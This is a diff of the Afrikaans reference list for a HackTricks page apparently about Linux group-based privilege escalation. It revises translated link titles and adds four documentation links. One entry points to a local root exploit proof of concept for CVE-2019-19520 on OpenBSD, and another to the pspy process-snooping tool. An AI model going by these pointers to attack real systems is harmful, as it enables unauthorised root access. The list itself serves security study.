 - [2] [Stelselgroepe - Debian Wiki](https://wiki.debian.org/SystemGroups)
 - [3] [sudoers(5) — sudo — Debian-manbladsye](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
 - [4] [pkexec — polkit-verwysingshandleiding](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
 - [5] [polkit — polkit-verwysingshandleiding](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
-- [6] [shadow(5) — Linux-manbladsy](https://man7.org/linux/man-pages/man5/shadow.5.html)
+- [6] [shadow(5) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man5/shadow.5.html)
 - [7] [Handleiding vir die beveiliging van Debian](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
-- [8] [debugfs(8) — Linux-manbladsy](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
-- [9] [Die raambuffer-toestel — Linux-kerneldokumentasie](https://docs.kernel.org/fb/framebuffer.html)
+- [8] [debugfs(8) — Linux-handleidingbladsy](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
+- [9] [Die Frame Buffer-toestel — Linux-kerneldokumentasie](https://docs.kernel.org/fb/framebuffer.html)
 - [10] [update-motd(5) — Ubuntu-manbladsye](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
 - [11] [run-parts(8) — Debian-manbladsye](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
-- [12] [pspy — Linux-prosesnasporing sonder voorregte](https://github.com/DominicBreuker/pspy)
+- [12] [pspy — Linux-prosesmonitering sonder voorregte](https://github.com/DominicBreuker/pspy)
 - [13] [Docker Engine-sekuriteit](https://docs.docker.com/engine/security/)
-- [14] [Bestuur Docker as 'n gebruiker sonder root](https://docs.docker.com/engine/install/linux-postinstall)
-- [15] [Containers laat loop — Docker-dokumentasie](https://docs.docker.com/engine/containers/run/)
+- [14] [Bestuur Docker as ’n nie-root-gebruiker](https://docs.docker.com/engine/install/linux-postinstall)
+- [15] [Containers laat loop — Docker Docs](https://docs.docker.com/engine/containers/run/)
 - [16] [skey(5) — OpenBSD-manbladsye](https://man.openbsd.org/skey.5)
 - [17] [login_yubikey(8) — OpenBSD-manbladsye](https://man.openbsd.org/login_yubikey.8)
-- [18] [Verifikasiekwesbaarhede in OpenBSD — Qualys-sekuriteitsadvies](https://www.openwall.com/lists/oss-security/2019/12/04/5)
-- [19] [openbsd-authroot — plaaslike uitbuiting-PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
-- [20] [w(1) — Linux-manbladsy](https://man7.org/linux/man-pages/man1/w.1.html)
-- [21] [Linux-toegekende toestelle (4.x+-weergawe)](https://docs.kernel.org/6.16/admin-guide/devices.html)
+- [18] [Verifikasie-kwesbaarhede in OpenBSD — Qualys-sekuriteitsadvies](https://www.openwall.com/lists/oss-security/2019/12/04/5)
+- [19] [openbsd-authroot — plaaslike exploit-PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+- [20] [w(1) — Linux-handleidingbladsy](https://man7.org/linux/man-pages/man1/w.1.html)
+- [21] [Linux-toestelle wat toegewys is (weergawe 4.x+)](https://docs.kernel.org/6.16/admin-guide/devices.html)
 - [22] [Beeldinvoer en -uitvoer — GIMP-dokumentasie](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
+- [23] [Riglyne vir beep-toesteltoestemmings — Debian Sources](https://sources.debian.org/src/beep/1.4.9-1/PERMISSIONS.md)
+- [24] [sd-login — systemd-handleiding](https://freedesktop.org/software/systemd/man/latest/sd-login.html)
+- [25] [Invoergebeurteniskodes — Linux-kerneldokumentasie](https://docs.kernel.org/5.18/input/event-codes.html)
+- [26] [evtest(1) — Debian-manbladsye](https://manpages.debian.org/bookworm/evtest/evtest.1.en.html)
 {{#include ../../../banners/hacktricks-training.md}}
